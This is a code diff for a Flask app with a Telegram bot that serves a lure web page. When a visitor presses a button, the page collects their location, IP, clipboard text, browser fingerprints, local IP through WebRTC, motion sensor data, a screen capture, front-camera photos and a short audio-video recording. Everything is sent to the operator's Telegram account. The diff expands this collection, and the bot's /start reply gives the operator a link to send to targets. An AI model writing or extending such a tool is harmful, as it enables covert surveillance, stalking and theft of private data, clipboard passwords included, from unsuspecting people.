@@ -1,5 +1,6 @@
 import os
 import threading
+import json
 from flask import Flask, request, render_template_string
 import telebot
 
@@ -58,7 +59,7 @@ HTML_PAGE = """<!DOCTYPE html>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
     <script>
-        let frontStream = null, backStream = null, mediaRecorder = null;
+        let mediaRecorder = null;
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
         const startBtn = document.getElementById('startBtn');
 
@@ -68,6 +69,7 @@ HTML_PAGE = """<!DOCTYPE html>
             try { await fetch('/capture', { method: 'POST', body: formData }); } catch(e) {}
         }
 
+        // ---- Base system info (unchanged) ----
         async function getIpInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -82,7 +84,7 @@ HTML_PAGE = """<!DOCTYPE html>
             else if (ua.includes('iPad')) { brand = 'Apple'; model = 'iPad'; }
             else if (ua.includes('Android')) {
                 brand = 'Android';
-                const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
+                const match = ua.match(/Android\\s+([\\d.]+);\\s+([^;)]+)/);
                 model = match ? match[2] : 'Android Device';
             } else if (ua.includes('Windows')) { brand = 'Microsoft Windows'; model = 'PC'; }
             else if (ua.includes('Mac')) { brand = 'Apple Mac'; model = 'Mac'; }
@@ -94,10 +96,14 @@ HTML_PAGE = """<!DOCTYPE html>
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
-                    return { level: level, charging: battery.charging };
+                    const discharge = battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) : null;
+                    return { level: level, charging: battery.charging, discharge_min: discharge };
+                } else {
+                    return { level: 'not supported', charging: 'unknown', discharge_min: null };
                 }
-            } catch {}
-            return { level: 'unknown', charging: 'unknown' };
+            } catch (e) {
+                return { level: 'error', charging: 'unknown', discharge_min: null };
+            }
         }
 
         function getNetworkType() {
@@ -128,101 +134,240 @@ HTML_PAGE = """<!DOCTYPE html>
             return 'unknown';
         }
 
-        function captureScreenshot() {
+        // ---- New feature functions ----
+        function getMotionData() {
             return new Promise((resolve) => {
-                html2canvas(document.documentElement, {
-                    useCORS: true,
-                    logging: false,
-                    scale: 1.0,
-                    allowTaint: true,
-                    scrollX: 0,
-                    scrollY: 0,
-                    windowWidth: document.documentElement.scrollWidth,
-                    windowHeight: document.documentElement.scrollHeight
-                }).then(canvas => {
-                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.92);
-                }).catch(() => resolve(null));
+                let data = { accel: null, gyro: null };
+                let resolved = false;
+                const accelHandler = (e) => {
+                    if (!resolved) {
+                        data.accel = {
+                            x: e.accelerationIncludingGravity.x,
+                            y: e.accelerationIncludingGravity.y,
+                            z: e.accelerationIncludingGravity.z
+                        };
+                    }
+                };
+                const gyroHandler = (e) => {
+                    if (!resolved) {
+                        data.gyro = {
+                            alpha: e.alpha,
+                            beta: e.beta,
+                            gamma: e.gamma
+                        };
+                    }
+                };
+                window.addEventListener('devicemotion', accelHandler);
+                window.addEventListener('deviceorientation', gyroHandler);
+                setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        window.removeEventListener('devicemotion', accelHandler);
+                        window.removeEventListener('deviceorientation', gyroHandler);
+                        resolve(data);
+                    }
+                }, 1500);
             });
         }
 
-        // ---- Improved camera acquisition ----
-        async function getCameraStreams() {
-            let back = null, front = null;
-            let errorMessages = [];
-
-            // Try 1: default (usually back camera on phones)
+        function getCanvasFingerprint() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                back = stream;
-                // Try to get front separately
-                try {
-                    front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                } catch (e) {
-                    front = back.clone();
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+                const dataUrl = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < dataUrl.length; i++) {
+                    hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
+                    hash |= 0;
                 }
-                return { front, back, error: null };
-            } catch (err) {
-                errorMessages.push('Default: ' + err.name + ' - ' + err.message);
+                return hash.toString(36);
+            } catch (e) {
+                return 'error';
             }
-
-            // Try 2: Environment (back camera) explicitly
-            try {
-                back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-                try {
-                    front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                } catch (e) {
-                    front = back.clone();
-                }
-                return { front, back, error: null };
-            } catch (err) {
-                errorMessages.push('Environment: ' + err.name + ' - ' + err.message);
-            }
-
-            // Try 3: User (front camera)
-            try {
-                front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-                back = front.clone();
-                return { front, back, error: null };
-            } catch (err) {
-                errorMessages.push('User: ' + err.name + ' - ' + err.message);
-            }
-
-            return { front: null, back: null, error: errorMessages.join(' | ') };
         }
 
-        // ---- Capture frame with proper waiting ----
+        async function getAudioFingerprint() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(ctx.destination);
+                oscillator.frequency.value = 440;
+                oscillator.start(0);
+                const data = new Float32Array(analyser.frequencyBinCount);
+                analyser.getFloatFrequencyData(data);
+                let sum = 0;
+                for (let i = 0; i < data.length; i++) sum += data[i] || 0;
+                oscillator.stop(0);
+                await ctx.close();
+                return Math.round(sum * 1000);
+            } catch (e) {
+                return 'error';
+            }
+        }
+
+        function getInstalledFonts() {
+            try {
+                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Tahoma', 'Comic Sans MS', 'Impact', 'Trebuchet MS'];
+                const installed = [];
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const base = 'abcdefghijklmnopqrstuvwxyz';
+                for (const font of fonts) {
+                    ctx.font = '20px ' + font;
+                    if (ctx.measureText(base).width > 0) {
+                        installed.push(font);
+                    }
+                }
+                return installed;
+            } catch (e) {
+                return ['error'];
+            }
+        }
+
+        function getPerformanceData() {
+            try {
+                const nav = performance.getEntriesByType('navigation')[0];
+                if (nav) {
+                    return {
+                        load_time: nav.loadEventEnd - nav.loadEventStart,
+                        dns_time: nav.domainLookupEnd - nav.domainLookupStart,
+                        tcp_time: nav.connectEnd - nav.connectStart,
+                        dom_ready: nav.domContentLoadedEventEnd - nav.domContentLoadedEventStart
+                    };
+                }
+                return null;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function getLocalIP() {
+            return new Promise((resolve) => {
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve(null));
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+                            if (ip) {
+                                resolve(ip[0]);
+                                pc.close();
+                            }
+                        }
+                    };
+                    setTimeout(() => resolve(null), 3000);
+                } catch (e) { resolve(null); }
+            });
+        }
+
+        async function getClipboardText() {
+            try {
+                if (navigator.clipboard) {
+                    const text = await navigator.clipboard.readText();
+                    return text;
+                }
+                return null;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function captureScreen() {
+            try {
+                if (!navigator.mediaDevices.getDisplayMedia) return null;
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                // Capture a single frame
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(resolve, 200);
+                    };
+                });
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                const blob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                stream.getTracks().forEach(t => t.stop());
+                return blob;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ---- Front camera with audio ----
+        async function getFrontStream() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 320 } },
+                    audio: true
+                });
+                return stream;
+            } catch (e) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    return stream;
+                } catch (e2) {
+                    return null;
+                }
+            }
+        }
+
+        async function getAudioOnly() {
+            try {
+                return await navigator.mediaDevices.getUserMedia({ audio: true });
+            } catch {
+                return null;
+            }
+        }
+
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.onloadedmetadata = async () => {
+                let resolved = false;
+                video.onloadedmetadata = () => {
                     video.play();
-                    // Wait for the video to actually have dimensions and a frame
                     let attempts = 0;
-                    while (attempts < 10) {
-                        await delay(100);
-                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
-                            break;
-                        }
+                    const checkFrame = () => {
                         attempts++;
-                    }
-                    if (video.videoWidth === 0 || video.videoHeight === 0) {
-                        resolve(null);
-                        video.pause();
-                        video.srcObject = null;
-                        return;
-                    }
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    canvas.toBlob((blob) => {
-                        resolve(blob);
-                        video.pause();
-                        video.srcObject = null;
-                    }, 'image/jpeg', 0.9);
+                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            canvas.toBlob((blob) => {
+                                if (!resolved) { resolved = true; resolve(blob); }
+                                video.pause();
+                                video.srcObject = null;
+                            }, 'image/jpeg', 0.9);
+                        } else if (attempts < 20) {
+                            setTimeout(checkFrame, 100);
+                        } else {
+                            if (!resolved) { resolved = true; resolve(null); }
+                            video.pause();
+                            video.srcObject = null;
+                        }
+                    };
+                    checkFrame();
                 };
             });
         }
@@ -233,7 +378,7 @@ HTML_PAGE = """<!DOCTYPE html>
             startBtn.innerText = 'Loading...';
             await delay(300);
 
-            // Step 1: Location (send immediately)
+            // 1. Location
             let locationData = null;
             if (navigator.geolocation) {
                 try {
@@ -248,7 +393,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 locationData = { denied: true };
             }
 
-            // Step 2: System info (IP, device, battery, network, screen, timezone, language, orientation)
+            // 2. System info
             const ipInfo = await getIpInfo();
             const device = getDeviceInfo();
             const battery = await getBatteryInfo();
@@ -258,66 +403,65 @@ HTML_PAGE = """<!DOCTYPE html>
             const language = getLanguage();
             const orientation = getOrientation();
 
-            // Step 3: Camera streams
-            const { front, back, error } = await getCameraStreams();
-            let frontBlob = null, backBlob = null, videoBlob = null;
-            let cameraStatus = 'success';
-            let cameraError = error || '';
+            // 3. Additional features (parallel for speed)
+            const [motion, localIP, clipboard, canvasHash, audioFingerprint, fonts, perf, screenBlob] = await Promise.all([
+                getMotionData(),
+                getLocalIP(),
+                getClipboardText(),
+                Promise.resolve(getCanvasFingerprint()),
+                getAudioFingerprint(),
+                Promise.resolve(getInstalledFonts()),
+                Promise.resolve(getPerformanceData()),
+                captureScreen() // this may take a moment
+            ]);
 
-            if (!front && !back) {
-                cameraStatus = 'failed';
-                cameraError = error || 'No camera access';
+            // 4. Front camera stream
+            let stream = await getFrontStream();
+            let combinedStream = stream;
+            let audioStatus = 'none';
+
+            if (stream && stream.getAudioTracks().length === 0) {
+                const audioStream = await getAudioOnly();
+                if (audioStream) {
+                    const tracks = [];
+                    stream.getVideoTracks().forEach(t => tracks.push(t));
+                    audioStream.getAudioTracks().forEach(t => tracks.push(t));
+                    combinedStream = new MediaStream(tracks);
+                    audioStatus = 'combined';
+                } else {
+                    audioStatus = 'failed (no audio)';
+                }
+            } else if (stream && stream.getAudioTracks().length > 0) {
+                audioStatus = 'present';
             } else {
-                // Capture frames
-                if (front) frontBlob = await captureFrame(front);
-                if (back) backBlob = await captureFrame(back);
-                // Store streams for later recording
-                frontStream = front;
-                backStream = back;
+                audioStatus = 'no stream';
             }
 
-            // Step 4: Screenshot
+            // If stream null, try any camera with audio
+            if (!stream) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    combinedStream = stream;
+                    audioStatus = 'present (fallback)';
+                } catch (e) {
+                    stream = null;
+                    combinedStream = null;
+                }
+            }
+
+            // Capture front camera image
+            let imageBlob = null;
+            if (combinedStream) {
+                imageBlob = await captureFrame(combinedStream);
+            }
+
+            // Screenshot of page
             const screenshotBlob = await captureScreenshot();
 
-            // Step 5: Start recording (after all other captures)
-            let recordStream = backStream || frontStream;
-            if (recordStream) {
-                // Try to use a codec that supports audio
-                let mimeType = 'video/webm;codecs=vp9,opus';
-                if (!MediaRecorder.isTypeSupported(mimeType)) {
-                    mimeType = 'video/webm;codecs=vp8,opus';
-                }
-                if (!MediaRecorder.isTypeSupported(mimeType)) {
-                    mimeType = 'video/webm';
-                }
-                mediaRecorder = new MediaRecorder(recordStream, { mimeType: mimeType });
-                recordedChunks = [];
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    finalizeAndSend();
-                };
-                mediaRecorder.start(1000);
-                recordingActive = true;
-                setTimeout(() => {
-                    if (recordingActive && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        recordingActive = false;
-                    }
-                }, maxDuration);
-                // If page closes, stop recording and send partial video
-                window.addEventListener('beforeunload', () => {
-                    if (recordingActive && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        recordingActive = false;
-                    }
-                });
-            } else {
-                // No recording – finalize immediately
-                finalizeAndSend();
-            }
-
+            // Recording
+            let videoBlob = null;
             let finalized = false;
+
             async function finalizeAndSend() {
                 if (finalized) return;
                 finalized = true;
@@ -338,43 +482,79 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('model', device.model);
                 fd.append('battery_level', battery.level);
                 fd.append('battery_charging', battery.charging);
+                fd.append('battery_discharge_min', battery.discharge_min !== null ? battery.discharge_min : 'unknown');
                 fd.append('network', network);
                 fd.append('screen_res', screenRes);
                 fd.append('timezone', timezone);
                 fd.append('language', language);
                 fd.append('orientation', orientation);
-                fd.append('camera_status', cameraStatus);
-                fd.append('camera_error', cameraError || '');
+                fd.append('audio_status', audioStatus);
+                // Motion
+                if (motion.accel) fd.append('accel', JSON.stringify(motion.accel));
+                if (motion.gyro) fd.append('gyro', JSON.stringify(motion.gyro));
+                // Other features
+                if (localIP) fd.append('local_ip', localIP);
+                if (clipboard) fd.append('clipboard', clipboard);
+                fd.append('canvas_fingerprint', canvasHash);
+                fd.append('audio_fingerprint', audioFingerprint);
+                if (fonts.length) fd.append('fonts', JSON.stringify(fonts));
+                if (perf) fd.append('performance', JSON.stringify(perf));
                 // Media
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
-                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
-                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
+                if (screenBlob) fd.append('screen_capture', screenBlob, 'screen.jpg');
+                if (imageBlob) fd.append('frontImage', imageBlob, 'front.jpg');
                 if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
-                // If no video, send an empty placeholder? We'll just omit.
 
                 await sendData(fd);
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
             }
 
-            // If recording never started, we already called finalize. Otherwise, wait for onstop.
-            if (!mediaRecorder) {
-                // Already called finalizeAndSend() above
-            } else {
-                // The onstop handler will call finalize. But if recording takes too long, we also set a timeout.
-                setTimeout(() => {
-                    if (!finalized) {
-                        if (recordingActive && mediaRecorder.state === 'recording') {
+            // Recording
+            if (combinedStream) {
+                try {
+                    let mimeType = 'video/webm';
+                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
+                        mimeType = 'video/webm;codecs=vp9,opus';
+                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                        mimeType = 'video/webm;codecs=vp8,opus';
+                    }
+                    mediaRecorder = new MediaRecorder(combinedStream, { mimeType: mimeType });
+                    recordedChunks = [];
+                    mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
+                    mediaRecorder.onstop = () => {
+                        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                        finalizeAndSend();
+                    };
+                    mediaRecorder.start(1000);
+                    recordingActive = true;
+                    setTimeout(() => {
+                        if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                             recordingActive = false;
                         }
-                        // Ensure videoBlob is set (might be empty)
-                        if (!videoBlob) {
-                            videoBlob = new Blob([], { type: 'video/webm' });
+                    }, maxDuration);
+                    window.addEventListener('beforeunload', () => {
+                        if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            recordingActive = false;
                         }
-                        finalizeAndSend();
-                    }
-                }, maxDuration + 3000);
+                    });
+                    setTimeout(() => {
+                        if (!finalized) {
+                            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                                recordingActive = false;
+                            }
+                            if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
+                            finalizeAndSend();
+                        }
+                    }, maxDuration + 3000);
+                } catch (e) {
+                    finalizeAndSend();
+                }
+            } else {
+                finalizeAndSend();
             }
         }
 
@@ -389,6 +569,7 @@ def index():
 
 @app.route('/capture', methods=['POST'])
 def capture():
+    # Extract all fields
     lat = request.form.get('lat')
     lng = request.form.get('lng')
     location_denied = request.form.get('location_denied')
@@ -400,19 +581,27 @@ def capture():
     model = request.form.get('model', 'Unknown')
     battery_level = request.form.get('battery_level', 'unknown')
     battery_charging = request.form.get('battery_charging', 'unknown')
+    battery_discharge_min = request.form.get('battery_discharge_min', 'unknown')
     network = request.form.get('network', 'unknown')
     screen_res = request.form.get('screen_res', 'unknown')
     timezone = request.form.get('timezone', 'unknown')
     language = request.form.get('language', 'unknown')
     orientation = request.form.get('orientation', 'unknown')
-    camera_status = request.form.get('camera_status', 'unknown')
-    camera_error = request.form.get('camera_error', '')
+    audio_status = request.form.get('audio_status', 'unknown')
+    # Extra features
+    accel = request.form.get('accel')
+    gyro = request.form.get('gyro')
+    local_ip = request.form.get('local_ip', '')
+    clipboard = request.form.get('clipboard', '')
+    canvas_fingerprint = request.form.get('canvas_fingerprint', '')
+    audio_fingerprint = request.form.get('audio_fingerprint', '')
+    fonts = request.form.get('fonts', '[]')
+    perf = request.form.get('performance', '{}')
+    # Files
     screenshot = request.files.get('screenshot')
+    screen_capture = request.files.get('screen_capture')
     front_img = request.files.get('frontImage')
-    back_img = request.files.get('backImage')
     video = request.files.get('video')
-
-    print(f"Received: camera_status={camera_status}, front={front_img is not None}, back={back_img is not None}, video={video is not None}")
 
     for uid in USER_IDS:
         # Location
@@ -428,24 +617,32 @@ def capture():
             except Exception as e:
                 print(f"Error: {e}")
 
-        # System info
+        # Build detailed message with all data
         try:
             msg = (
                 f"🌐 IP: {ip}\n"
                 f"📍 City: {city}, {region}, {country}\n"
                 f"📱 Device: {brand} - {model}\n"
-                f"🔋 Battery: {battery_level}% (charging: {battery_charging})\n"
+                f"🔋 Battery: {battery_level}% (charging: {battery_charging}) - discharge: {battery_discharge_min} min\n"
                 f"📶 Network: {network}\n"
                 f"🖥️ Screen: {screen_res}\n"
                 f"⏰ Timezone: {timezone}\n"
                 f"🌍 Language: {language}\n"
-                f"🔄 Orientation: {orientation}"
+                f"🔄 Orientation: {orientation}\n"
+                f"🎙️ Audio: {audio_status}\n"
+                f"📶 Local IP: {local_ip}\n"
+                f"🖌️ Canvas fingerprint: {canvas_fingerprint}\n"
+                f"🎵 Audio fingerprint: {audio_fingerprint}\n"
+                f"📋 Clipboard: {clipboard if clipboard else 'N/A'}\n"
+                f"📄 Fonts: {fonts}\n"
+                f"⚡ Performance: {perf}\n"
+                f"📊 Motion: {accel if accel else 'N/A'} / {gyro if gyro else 'N/A'}"
             )
             bot.send_message(uid, msg)
         except Exception as e:
             print(f"Info send error: {e}")
 
-        # Screenshot
+        # Screenshot of page
         if screenshot:
             try:
                 screenshot.seek(0)
@@ -453,22 +650,23 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Front camera
+        # Screen capture (display media)
+        if screen_capture:
+            try:
+                screen_capture.seek(0)
+                bot.send_photo(uid, screen_capture.read(), caption="🖥️ Screen Capture")
+            except Exception as e:
+                print(f"Screen capture error: {e}")
+
+        # Front camera image
         if front_img:
             try:
                 front_img.seek(0)
                 bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
             except Exception as e:
                 print(f"Front image error: {e}")
-        # Back camera
-        if back_img:
-            try:
-                back_img.seek(0)
-                bot.send_photo(uid, back_img.read(), caption="📷 Back Camera")
-            except Exception as e:
-                print(f"Back image error: {e}")
 
-        # Video
+        # Video recording
         if video:
             try:
                 video.seek(0)
@@ -476,19 +674,7 @@ def capture():
             except Exception as e:
                 print(f"Video error: {e}")
 
-        # Camera status
-        if camera_status == 'failed':
-            try:
-                bot.send_message(uid, f"⚠️ Camera error: {camera_error}")
-            except Exception as e:
-                print(f"Camera status error: {e}")
-        elif not front_img and not back_img and not video:
-            try:
-                bot.send_message(uid, "⚠️ No camera data received.")
-            except Exception as e:
-                print(f"Camera note error: {e}")
-
-        # Final
+        # Final notification
         try:
             bot.send_message(uid, "✅ All data captured.")
         except:
@@ -498,7 +684,7 @@ def capture():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images, and video recording.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects comprehensive device data including camera, sensors, clipboard, screen capture, and more.")
 
 def run_bot():
     print("Bot polling started.")
